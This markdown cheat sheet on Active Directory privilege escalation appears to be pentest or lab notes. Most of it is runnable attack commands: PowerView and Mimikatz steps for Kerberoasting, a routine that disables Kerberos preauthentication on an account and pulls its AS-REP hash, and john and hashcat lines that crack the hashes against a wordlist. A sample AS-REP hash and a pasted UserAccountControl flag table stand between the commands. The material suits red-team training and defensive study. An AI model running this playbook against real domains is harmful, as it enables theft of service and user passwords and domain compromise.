## PRIV ESC

#### KERBEROAST
Main objectif: Search account with SPN and crack TGS ticket
- Find user accounts used as SA
```powershell
Get-NetUser -SPN
Get-NetUser -SPN | Format-List name,distinguishedName,servicePrincipalName
#
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
- Request a TGS
```powershell
Request-SPNTicket
#
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/lab-mgmt.domain.local"
```
- Check if the TGS has been granted
```powershell
klist
```
- Export all tickets using Mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
- Crack the Service account password
```powershell
python.exe .\tgsrepcrack.py .\password.list .\2-40a10000-jane@MSSQLSvc~lab-mgmt.domain.local-DOMAIN.LOCAL.kirbi
```

---
#### KERBEROASTING
Main objectif: If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline

:information_source: With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled

- Find user accounts with Kerberos Preauth disabled (Using PowerView dev)
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
#
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
- Find user accounts and force Preauth to disabled, enumerate the permissions for DPUsers on ACLs using PowerView (dev)
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
# 4194304 -> Value in decimal for DONT_REQ_PREAUTH
Set-DomainObject -Identity controleduser -XOR @{useraccountcontrol=4194304} -Verbose
Get-DomainUser -PreauthNotRequired -Verbose
#
Get-DomainUser -PreauthNotRequired -Identity controleduser
```

You can view and edit these attributes by using either the Ldp.exe tool or the Adsiedit.msc snap-in.

The following table lists possible flags that you can assign. You cannot set some of the values on a user or computer object because these values can be set or reset only by the directory service. Note that Ldp.exe shows the values in hexadecimal. Adsiedit.msc displays the values in decimal. The flags are cumulative. To disable a user's account, set the UserAccountControl attribute to 0x0202 (0x002 + 0x0200). In decimal, this is 514 (2 + 512).

Note You can directly edit Active Directory in both Ldp.exe and Adsiedit.msc. Only experienced administrators should use these tools to edit Active Directory. Both tools are available after you install the Support tools from your original Windows installation media. 
| Property flag 	| Value in hexadecimal 	| Value in decimal 	|
|---	|---	|---	|
| SCRIPT<br>The logon script will be run. 	| 0x0001 	| 1
| ACCOUNTDISABLE<br>The user account is disabled. 	| 0x0002 	| 2
| HOMEDIR_REQUIRED<br>The home folder is required. 	| 0x0008 	| 8
| LOCKOUT 	| 0x0010 	| 16
| PASSWD_NOTREQD<br>No password is required. 	| 0x0020 	| 32
| PASSWD_CANT_CHANGE<br>The user cannot change the password. This is a permission on the user's object. 	| 0x0040 	| 64
| ENCRYPTED_TEXT_PWD_ALLOWED<br>The user can send an encrypted password. 	| 0x0080 	| 128
| TEMP_DUPLICATE_ACCOUNT<br>This is an account for users whose primary account is in another domain. This account provides user access to this domain, but not to any domain that trusts this domain. This is sometimes referred to as a local user account. 	| 0x0100 	| 256
| NORMAL_ACCOUNT<br>This is a default account type that represents a typical user. 	| 0x0200 	| 512
| INTERDOMAIN_TRUST_ACCOUNT<br>This is a permit to trust an account for a system domain that trusts other domains. 	| 0x0800 	| 2048
| WORKSTATION_TRUST_ACCOUNT<br>This is a computer account for a computer that is running Microsoft Windows NT 4.0 Workstation, Microsoft Windows NT 4.0 Server, Microsoft Windows 2000 Professional, or Windows 2000 Server and is a member of this domain. 	| 0x1000 	| 4096
| SERVER_TRUST_ACCOUNT<br>This is a computer account for a domain controller that is a member of this domain. 	| 0x2000 	| 8192
| DONT_EXPIRE_PASSWORD<br>Represents the password, which should never expire on the account. 	| 0x10000 	| 65536
| MNS_LOGON_ACCOUNT<br>This is an MNS logon account. 	| 0x20000 	| 131072
| SMARTCARD_REQUIRED<br>When this flag is set, it forces the user to log on by using a smart card. 	| 0x40000 	| 262144
| TRUSTED_FOR_DELEGATION<br>When this flag is set, the service account (the user or computer account) under which a service runs is trusted for Kerberos delegation. Any such service can impersonate a client requesting the service. To enable a service for Kerberos delegation, you must set this flag on the userAccountControl property of the service account. 	| 0x80000 	| 524288
| NOT_DELEGATED<br>When this flag is set, the security context of the user is not delegated to a service even if the service account is set as trusted for Kerberos delegation. 	| 0x100000 	| 1048576
| USE_DES_KEY_ONLY<br>(Windows 2000/Windows Server 2003) Restrict this principal to use only Data Encryption Standard (DES) encryption types for keys. 	| 0x200000 	| 2097152
| DONT_REQ_PREAUTH<br>(Windows 2000/Windows Server 2003) This account does not require Kerberos pre-authentication for logging on. 	| 0x400000 	| 4194304
| PASSWORD_EXPIRED<br>(Windows 2000/Windows Server 2003) The user's password has expired. 	| 0x800000 	| 8388608
| TRUSTED_TO_AUTH_FOR_DELEGATION<br>(Windows 2000/Windows Server 2003) The account is enabled for delegation. This is a security-sensitive setting. Accounts that have this option enabled should be tightly controlled. This setting lets a service that runs under the account assume a client's identity and authenticate as that user to other remote servers on the network.  	| 0x1000000 	| 16777216
| PARTIAL_SECRETS_ACCOUNT<br>(Windows Server 2008/Windows Server 2008 R2) The account is a read-only domain controller (RODC). This is a security-sensitive setting. Removing this setting from an RODC compromises security on that server. 	| 0x04000000  	| 67108864

These are the default UserAccountControl values for the certain objects:
* Typical user : 0x200 (512)
* Domain controller : 0x82000 (532480)
* Workstation/server: 0x1000 (4096)

- Request encrypted AS-REP for offline brute-force
```powershell
Get-ASREPHash -UserName controleduser -Verbose
```
- All users with Kerberos preauth disabled and request a hash
```powershell
Invoke-ASREPRoast -Verbose
```
- Check if you can crack with john
```bash
$krb5asrep$controleduser@domain.local:13d55a1f0b1aa3c39a3c5a6815f40ee3$ee68bfe89b0fd40326189cf255a148957bd1d2900cce75fb3f3db56c4086e2d207641a1f5744fd9505ba39d0238b6828b6311eb049d6ee82e8d1deac23f61e252
ef6aaa7997a3445334280178bb5483f445a0e5156512f9421edfdd2b2dc04a3dddf951c90fbe647f01dd7f14a97a89ab96f89e3acc3cdfd113fa214fe10ee53cc47e99929e9358ba215cd161855d8945e7b2e9dacd4e16a77d53fbaedbb486dfb5a4726ed1d3f395618
6d1dbbe33b9fe6cd1d19e0993193cebd1f80c3fdfb2265fe7a6b6690d488400a80f272650a4a89dd84a1ce17651c103ae498226ab569e953998e4f1823e18632ede548a4c38923a5cb5ed6d1c49f5edf475f0f5690617dee6f898dfcd52e

john controleduser.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- Check if you can crack with hashcat, need add $23 
```bash
$krb5asrep$23$controleduser@domain.local:13d55a1f0b1aa3c39a3c5a6815f40ee3$ee68bfe89b0fd40326189cf255a148957bd1d2900cce75fb3f3db56c4086e2d207641a1f5744fd9505ba39d0238b6828b6311eb049d6ee82e8d1deac23f61e252
ef6aaa7997a3445334280178bb5483f445a0e5156512f9421edfdd2b2dc04a3dddf951c90fbe647f01dd7f14a97a89ab96f89e3acc3cdfd113fa214fe10ee53cc47e99929e9358ba215cd161855d8945e7b2e9dacd4e16a77d53fbaedbb486dfb5a4726ed1d3f395618
6d1dbbe33b9fe6cd1d19e0993193cebd1f80c3fdfb2265fe7a6b6690d488400a80f272650a4a89dd84a1ce17651c103ae498226ab569e953998e4f1823e18632ede548a4c38923a5cb5ed6d1c49f5edf475f0f5690617dee6f898dfcd52e

hashcat -m 18200 controleduser.txt /usr/share/wordlists/rockyou.txt -o cracked
```

---
#### SET SPN
:construction_worker: